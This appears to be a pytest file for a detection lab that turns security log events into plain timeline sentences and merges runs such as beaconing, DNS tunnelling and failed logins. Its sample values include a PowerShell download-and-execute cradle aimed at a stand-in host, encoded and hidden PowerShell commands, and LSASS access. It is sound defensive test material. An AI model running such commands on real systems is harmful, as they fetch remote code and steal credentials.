"""The case timeline: one plain sentence per kind of event, and runs of similar events merged into one row."""

import pytest

from detlab.schema import ACTIONS
from detlab.timeline import RUN_GAP_SECONDS, build_timeline, describe_event, describe_run

T0 = 1_760_000_000.0


def ev(i, action, t=None, **fields):
    t = T0 + i if t is None else t
    from detlab.models import fmt_ts
    return {"event_id": f"e{i:05d}", "_t": t, "ts": fmt_ts(t), "action": action, **fields}


# Every field of every action filled in, so a sentence that forgets a field shows up as "?".
SAMPLE_VALUES = {
    "outcome": "success", "src_ip": "203.0.113.9", "country": "RO", "asn": "AS1", "service": "o365", "device_id": "d1",
    "logon_type": 3, "method": "push", "process_name": "powershell.exe", "process_path": "C:\\x\\powershell.exe",
    "parent_process": "winword.exe", "parent_path": "C:\\x\\winword.exe", "command_line": "powershell -enc AAAA",
    "parent_command_line": "winword.exe /n", "original_name": "PowerShell.EXE", "integrity": "High",
    "target_process": "lsass.exe", "target_path": "C:\\Windows\\System32\\lsass.exe", "granted_access": "0x1410",
    "call_trace": "ntdll.dll+1", "registry_key": "HKU\\S-1\\Run", "registry_value": "C:\\Users\\a\\x.exe",
    "file_path": "C:\\Users\\a\\x.exe", "service_name": "PSEXESVC", "service_path": "%SystemRoot%\\PSEXESVC.exe",
    "service_account": "LocalSystem", "task_name": "\\Updater", "task_command": "powershell -w hidden",
    "target_user": "eve", "group": "Domain Admins", "object_type": "domainDNS", "properties": "{1131f6aa}",
    "access_mask": "0x100", "log_name": "Security", "subcategory": "Logon", "audit_changes": "Success removed",
    "script_text": "IEX (New-Object Net.WebClient).DownloadString('http://x/a')", "src_port": 50000,
    "dst_ip": "203.0.113.50", "dst_port": 443, "dst_scope": "external", "protocol": "tcp", "bytes_out": 2048,
    "bytes_in": 1024, "query": "a.example.com", "domain": "example.com", "query_type": "A",
    "event_name": "CreateAccessKey", "event_source": "iam.amazonaws.com", "mfa_used": False, "resource": "arn:x",
}


def full_event(action):
    fields = {k: SAMPLE_VALUES[k] for k in ACTIONS[action]["fields"]}
    return ev(1, action, user="adm.rossi", host="WS-ADM-01", **fields)


@pytest.mark.parametrize("action", sorted(ACTIONS))
def test_every_kind_of_event_has_a_sentence_that_uses_its_fields(action):
    text, detail = describe_event(full_event(action))
    assert text and text != action and "?" not in text, text
    assert "WS-ADM-01" in text or action in ("login", "mfa_prompt", "cloud_audit", "dns_query") or "WS-ADM-01" in (detail or ""), text


@pytest.mark.parametrize("action", sorted(ACTIONS))
def test_an_event_with_missing_fields_never_breaks_the_describer(action):
    text, detail = describe_event({"event_id": "x", "action": action})
    assert isinstance(text, str) and text
    assert detail is None or isinstance(detail, str)


def test_an_unknown_kind_of_event_still_gets_a_line():
    assert describe_event({"action": "teleport", "host": "WS-1"}) == ("teleport on WS-1", None)


def test_long_details_are_clipped_and_flattened():
    long = describe_event(ev(1, "process_create", process_name="a.exe", command_line="a\n" + "b " * 300, user="u", host="h",
                             parent_process="p"))[1]
    assert long.endswith("...") and "\n" not in long and len(long) <= 203


def test_a_run_of_connections_becomes_one_row_with_a_count_and_a_rhythm():
    window = [ev(i, "network_connect", t=T0 + i * 60, host="SRV-1", process_name="rundll32.exe", dst_ip="203.0.113.50",
                 dst_port=443, protocol="tcp", bytes_out=1024, bytes_in=512) for i in range(180)]
    cited = {w["event_id"]: ["A-0005"] for w in window}
    rows = build_timeline(window, cited)
    assert len(rows) == 1
    row = rows[0]
    assert row["count"] == 180 and row["alerts"] == ["A-0005"] and row["kind"] == "network_connect"
    assert row["text"].startswith("180 connections by rundll32.exe on SRV-1 to 203.0.113.50:443 (tcp), about every 60s")
    assert row["note"] == "180.0 KB sent and 90.0 KB received in total"


def test_events_with_different_alerts_are_not_merged():
    window = [ev(i, "network_connect", host="H", process_name="p.exe", dst_ip="1.2.3.4", dst_port=443, protocol="tcp")
              for i in range(4)]
    rows = build_timeline(window, {window[0]["event_id"]: ["A-1"], window[1]["event_id"]: ["A-1"]})
    assert [r["count"] if "count" in r else 1 for r in rows] == [2, 2]
    assert rows[0]["alerts"] == ["A-1"] and rows[1]["alerts"] == []


def test_a_long_pause_starts_a_new_row():
    a = [ev(i, "dns_query", host="H", domain="d.com", query=f"{i}.d.com", query_type="A", process_name="p") for i in range(3)]
    b = [ev(10 + i, "dns_query", t=T0 + RUN_GAP_SECONDS + 100 + i, host="H", domain="d.com", query=f"x{i}.d.com",
            query_type="A", process_name="p") for i in range(3)]
    rows = build_timeline(a + b, {})
    assert [r["count"] for r in rows] == [3, 3]


def test_other_events_in_between_do_not_break_a_run():
    conn = lambda i: ev(i, "network_connect", host="H", process_name="p.exe", dst_ip="1.2.3.4", dst_port=443, protocol="tcp")
    window = [conn(1), ev(2, "process_create", process_name="x.exe", user="u", host="H", parent_process="y.exe"), conn(3), conn(4)]
    rows = build_timeline(window, {})
    assert [r["kind"] for r in rows] == ["network_connect", "process"]
    assert rows[0]["count"] == 3


def test_failed_logins_from_one_address_become_one_line():
    window = [ev(i, "login", outcome="failure", user="d.okafor", src_ip="203.0.113.77", country="BR", service="rdp")
              for i in range(40)]
    rows = build_timeline(window, {w["event_id"]: ["A-7"] for w in window[:3]})
    assert len(rows) == 1 and rows[0]["kind"] == "failures" and rows[0]["count"] == 40
    assert rows[0]["text"].startswith("40 failed rdp logins from 203.0.113.77 (BR) against d.okafor")
    assert rows[0]["alerts"] == ["A-7"]


def test_failures_against_many_accounts_say_how_many():
    window = [ev(i, "login", outcome="failure", user=f"u{i}", src_ip="203.0.113.99", country="CN", service="o365") for i in range(12)]
    assert "against 12 different accounts" in build_timeline(window, {})[0]["text"]


def test_dns_runs_say_how_many_names_and_give_two_examples():
    window = [ev(i, "dns_query", t=T0 + i * 5, host="WS-31", domain="c2.net", query=f"{i:03d}.t.c2.net", query_type="A",
                 process_name="powershell.exe") for i in range(300)]
    row = build_timeline(window, {})[0]
    assert row["text"].startswith("300 DNS lookups under c2.net from WS-31 (powershell.exe), about every 5s")
    assert row["note"] == "300 different names, for example 000.t.c2.net, 001.t.c2.net"


def test_mfa_runs_use_plain_words_for_the_outcome():
    window = [ev(i, "mfa_prompt", outcome="timeout", method="push", user="dev.ops", src_ip="1.2.3.4", country="RO") for i in range(6)]
    assert build_timeline(window, {})[0]["text"].startswith("6 MFA push prompts for dev.ops were ignored (timed out)")
    one = describe_event(ev(1, "mfa_prompt", outcome="approved", method="push", user="dev.ops", src_ip="1.2.3.4", country="RO"))[0]
    assert one == "The MFA push prompt for dev.ops was approved (sign-in from 1.2.3.4, RO)"


def test_a_fan_out_of_network_logons_names_the_computers():
    window = [ev(i, "host_logon", outcome="success", logon_type=3, user="svc_patch", host=f"SRV-{i:02d}", src_ip="10.0.0.5")
              for i in range(14)]
    row = build_timeline(window, {})[0]
    assert row["text"].startswith("svc_patch logged on to 14 computers (success, over the network) from 10.0.0.5")
    assert row["note"] == "SRV-00, SRV-01, SRV-02 and 11 more"
    same = [ev(i, "host_logon", outcome="success", logon_type=10, user="c", host="SRV-01", src_ip="10.0.0.5") for i in range(2)]
    assert build_timeline(same, {})[0]["text"].startswith("c logged on 2 times to SRV-01 (success, remote desktop)")


def test_the_timeline_says_how_many_events_it_left_out():
    window = [ev(i, "user_create", user="it.admin", host="DC-01", target_user=f"n{i}") for i in range(10)]
    rows = build_timeline(window, {}, limit=3)
    assert len(rows) == 4 and rows[-1]["kind"] == "more" and rows[-1]["text"] == "7 more events are not shown."


def test_rows_never_leak_internal_bookkeeping():
    window = [ev(i, "network_connect", host="H", process_name="p", dst_ip="1.1.1.1", dst_port=1, protocol="tcp") for i in range(3)]
    for row in build_timeline(window, {}):
        assert not [k for k in row if k.startswith("_")]


def test_describe_run_of_one_is_the_same_as_the_event():
    e = ev(1, "file_create", process_name="msiexec.exe", host="WS-1", file_path="C:\\x")
    text, detail, note = describe_run([e])
    assert (text, detail) == describe_event(e) and note is None


# ------------------------------------------------------------- the lab's own cases

def test_the_beaconing_case_is_one_row_and_the_dns_tunnel_case_is_short(lab):
    beacon = lab.case_detail("CASE-003")["timeline"]
    assert len(beacon) == 1 and beacon[0]["count"] == 180 and "about every 60s" in beacon[0]["text"]
    tunnel = lab.case_detail("CASE-006")["timeline"]
    assert len(tunnel) <= 6 and tunnel[0]["count"] == 300


def test_no_case_timeline_shows_a_bare_event_name(lab):
    from detlab.schema import ACTIONS

    for case in lab.cases:
        for row in lab.case_detail(case.case_id)["timeline"]:
            assert row["text"] not in ACTIONS, f"{case.case_id}: a row that is only {row['text']!r}"
            assert len(row["text"]) > 12
